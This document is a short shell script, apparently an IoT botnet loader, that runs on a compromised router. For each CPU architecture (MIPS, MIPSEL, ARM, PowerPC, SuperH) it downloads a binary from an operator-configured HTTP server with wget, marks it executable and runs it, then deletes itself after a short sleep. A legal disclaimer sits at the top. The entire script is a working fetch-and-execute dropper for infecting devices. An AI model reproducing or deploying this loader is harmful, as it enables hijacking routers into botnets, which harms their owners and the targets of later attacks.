#!/bin/sh
# THIS SCRIPT DOWNLOAD THE BINARIES INTO ROUTER.
# UPLOAD GETBINARIES.SH IN YOUR HTTPD.
#
# LEGAL DISCLAIMER: It is the end user's responsibility to obey 
# all applicable local, state and federal laws. Developers assume 
# no liability and are not responsible for any misuse or damage 
# caused by this program.

# YOUR HTTPD SERVER:
REFERENCE_HTTP="http://127.0.0.1"

# NAME OF BINARIES:
REFERENCE_MIPSEL="mipsel"
REFERENCE_MIPS="mips"
REFERENCE_SUPERH="sh"
REFERENCE_ARM="arm"
REFERENCE_PPC="ppc"

rm -fr /var/run/${REFERENCE_MIPSEL} \
	/var/run/${REFERENCE_MIPS} \
	/var/run/${REFERENCE_SUPERH} \
	/var/run/${REFERENCE_ARM} \
	/var/run/${REFERENCE_PPC}

wget -c ${REFERENCE_HTTP}/${REFERENCE_MIPSEL} -P /var/run && chmod +x /var/run/${REFERENCE_MIPSEL} && /var/run/${REFERENCE_MIPSEL}
wget -c ${REFERENCE_HTTP}/${REFERENCE_MIPS} -P /var/run && chmod +x /var/run/${REFERENCE_MIPS} && /var/run/${REFERENCE_MIPS}
wget -c ${REFERENCE_HTTP}/${REFERENCE_ARM} -P /var/run && chmod +x /var/run/${REFERENCE_ARM} && /var/run/${REFERENCE_ARM}
wget -c ${REFERENCE_HTTP}/${REFERENCE_PPC} -P /var/run && chmod +x /var/run/${REFERENCE_PPC} && /var/run/${REFERENCE_PPC}
wget -c ${REFERENCE_HTTP}/${REFERENCE_SUPERH} -P /var/run && chmod +x /var/run/${REFERENCE_SUPERH} && /var/run/${REFERENCE_SUPERH}

sleep 3;
rm -fr /var/run/getbinaries.sh
